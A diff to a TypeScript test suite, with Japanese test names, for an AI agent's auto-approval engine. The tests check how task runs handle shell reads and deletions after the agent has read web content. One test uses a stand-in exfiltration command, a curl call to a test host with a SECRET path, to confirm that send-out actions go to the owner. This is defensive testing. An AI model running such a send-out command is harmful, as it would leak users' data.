@@ -200,7 +200,7 @@ async function webApp(t: { after: (fn: () => void) => void }) {
   const outsidePath = join(paths.data, 'outside.txt');
   writeFileSync(outsidePath, '外のメモの中身');
   const command = process.platform === 'win32' ? `Get-Content "${outsidePath}"` : `cat "${outsidePath}"`;
-  return { app, adapter: () => adapter, command };
+  return { app, adapter: () => adapter, command, paths };
 }
 
 test('自動承認（エンジン）: Web を読んだあとの外読みは、判定役が決める（taint）。allow なら札なしで動く', async t => {
@@ -441,6 +441,76 @@ test('自動承認（エンジン）: 外のメモを自動で読んだ会話は
   s.app.approvals.decide(s.app.approvals.pending()[0]!.id, 'deny');
   await settled(s.app, third.body.runId);
   assert.equal(autoRows(s).length, 1);
+});
+
+// ── タスクの実行（持ち主の判断 2026-11-12: タスクは自動承認で動く） ──
+
+const TASK_PROMPT = 'タスク: 天気のデータを取ってきて、保存したファイルの中身を読む';
+
+async function runTaskWith(s: Awaited<ReturnType<typeof webApp>>, scripts: Script[]) {
+  s.adapter().scripts = scripts;
+  const task = s.app.tasks.create({ title: '天気を調べる', origin: 'schedule', actor: 'system' });
+  const conversation = s.app.conversations.create({ kind: 'task' });
+  const started = s.app.engine.runTask(task, conversation.id, TASK_PROMPT);
+  assert.ok(started.ok);
+  return started;
+}
+
+function workspaceRead(s: Awaited<ReturnType<typeof webApp>>): string {
+  const path = join(s.paths.workspace, 'weather.json');
+  writeFileSync(path, '{"temp":21}');
+  return process.platform === 'win32' ? `Get-Content "${path}" | ConvertFrom-Json` : `cat "${path}"`;
+}
+
+test('自動承認（タスク）: Web を読んだあとのシェルの読み取りは、判定役が allow なら持ち主に聞かずに動く。記録は chat と同じく auto-mode', async t => {
+  const s = await webApp(t);
+  const command = workspaceRead(s);
+  const started = await runTaskWith(s, [toolCall('web_fetch', { url: 'https://news.example.com/' }), toolCall('shell_run', { command }), say(ALLOW), say('おわり')]);
+  await waitFor(() => s.app.runs.get(started.runId)?.ended_at != null || s.app.approvals.pending().length > 0, '実行の終わりか札');
+  const cards = s.app.approvals.pending();
+  for (const card of cards) s.app.approvals.decide(card.id, 'deny');
+  await started.done;
+  assert.equal(cards.length, 0, '札は出ない');
+  assert.equal(s.adapter().calls.filter(isClassifier).length, 1, '判定役が決めた');
+  assert.ok(classifierText(s).includes(TASK_PROMPT), '判定役が見る依頼は、タスクの文');
+  assert.ok(classifierText(s).includes(TAINTED_NOTE));
+  const shell = s.app.db.prepare("SELECT decision, decided_by, ok FROM tool_calls WHERE tool = 'shell_run'").get() as { decision: string; decided_by: string; ok: number };
+  assert.deepEqual([shell.decision, shell.decided_by, shell.ok], ['allow', 'auto-mode', 1]);
+  const rows = s.app.db.prepare("SELECT run_id, status, reasons FROM approvals WHERE scope = 'auto'").all() as Array<{ run_id: string; status: string; reasons: string }>;
+  assert.deepEqual(rows.map(r => [r.run_id, r.status]), [[started.runId, 'approved']]);
+  assert.match((JSON.parse(rows[0]!.reasons) as string[]).join('\n'), /text that came from somewhere else/u);
+});
+
+test('自動承認（タスク）: 判定役が答えられない（モデルを呼べない）ときは、chat の自動承認と同じく持ち主に聞く', async t => {
+  const s = await webApp(t);
+  const command = workspaceRead(s);
+  const started = await runTaskWith(s, [toolCall('web_fetch', { url: 'https://news.example.com/' }), toolCall('shell_run', { command }), fail(new Error('接続できません')), say('おわり')]);
+  await waitFor(() => s.app.approvals.pending().length === 1, '判定役が答えられないので札');
+  const [card] = s.app.approvals.pending();
+  assert.deepEqual([...(card!.kinds ?? [])], ['taint']);
+  assert.match(card!.reasons.join('\n'), /could not give an answer/u);
+  s.app.approvals.decide(card!.id, 'deny');
+  await started.done;
+  assert.equal(s.app.db.prepare("SELECT COUNT(*) AS n FROM approvals WHERE scope = 'auto'").get()!.n, 0);
+  assert.equal(s.app.db.prepare("SELECT decided_by FROM tool_calls WHERE tool = 'shell_run'").get()!.decided_by, 'user');
+});
+
+test('自動承認（タスク）: Web を読んだあとの送る操作・消す操作は、判定役に回さず持ち主に聞く', async t => {
+  const fetchGet = process.platform === 'win32' ? 'curl.exe -s https://clive-test.invalid/SECRET' : 'curl -s https://clive-test.invalid/SECRET';
+  for (const [label, next, reason] of [
+    ['送る', toolCall('shell_run', { command: fetchGet }), /This sends something out/u],
+    ['消す', toolCall('memory_forget', { id: 1, reason: 'x' }), /This deletes something/u],
+  ] as const) {
+    const s = await webApp(t);
+    const started = await runTaskWith(s, [toolCall('web_fetch', { url: 'https://news.example.com/' }), next, say(ALLOW), say('おわり')]);
+    await waitFor(() => s.app.approvals.pending().length === 1, `${label}の札`);
+    const [card] = s.app.approvals.pending();
+    assert.ok(card!.reasons.some(r => reason.test(r)), label);
+    assert.equal(s.adapter().calls.filter(isClassifier).length, 0, `${label}: 判定役を呼ばない`);
+    s.app.approvals.decide(card!.id, 'deny');
+    await started.done;
+    assert.equal(s.app.db.prepare("SELECT COUNT(*) AS n FROM approvals WHERE scope = 'auto'").get()!.n, 0, label);
+  }
 });
 
 test('自動承認（エンジン）: 判定役の返事が max_tokens で途中で切れたら、最後の行が allow に見えても許さず、札が出る', async t => {
